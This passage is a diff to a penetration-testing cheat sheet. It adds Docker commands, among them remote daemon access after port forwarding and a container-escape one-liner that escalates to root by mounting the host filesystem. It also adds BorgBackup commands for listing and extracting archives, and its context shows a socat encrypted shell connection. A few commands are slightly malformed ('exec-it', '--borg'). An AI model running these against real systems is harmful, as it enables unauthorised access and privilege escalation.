@@ -18,6 +18,14 @@
   - [Set up encrypted bind shell](#set-up-encrypted-bind-shell)
 - [TCPdump](#tcpdump)
   - [Useful options](#useful-options)
+- [Docker](#docker)
+  - [Useful options](#useful-options)
+  - [Docker commands on local machine after port forwarding](#docker-commands-on-local-machine-after-port-forwarding)
+  - [Escalate privilege to root](#escalate-privilege-to-root)
+- [Utilising BorgBackup](#utilising-borgbackup)
+  - [List all archives in the repo](#list-all-archives-in-the-repo)
+  - [List the contents of archive](#list-the-contents-of-archive)
+  - [Extract archive into local machine](#extract-archive-into-local-machine)
 
 ## Enumerating services
 ```
@@ -150,3 +158,32 @@ socat - OPENSSL:10.0.0.130:4443,verify=0
 | tcpdump -i eth0 -c 10  | Capture first 10 packets only. |
 | tcpdump -i any -w network.pcap | Save output to a file. |
 | tcpdump host 192.168.1.100 | Capture packets from a specific host. |
+
+## Docker
+### Useful options
+| Options | Description |
+| ------- | ----------- |
+| docker ps | List running containers |
+| docker images | List all images |
+| docker exec -it container-name /bin/sh | SSH into a container |
+| docker restart container-name | Restart a container |
+
+### Docker commands on local machine after port forwarding
+| Options | Description |
+| ------- | ----------- |
+| docker -H tcp://localhost:8080 images | List all images |
+| docker -H tcp://localhost:8080 container ls | List running containers |
+| docker -H tcp://localhost:8080 exec-it image-name sh | Get shell on instances |
+
+### Escalate privilege to root
+`docker run -v /:/mnt --rm -it image chroot /mnt sh`
+
+## Utilising BorgBackup
+### List all archives in the repo
+`--borg list directory-name`
+
+### List the contents of archive
+`--borg list directory-name::archive-name`
+
+### Extract archive into local machine
+`--borg extract directory-name::archive-name`
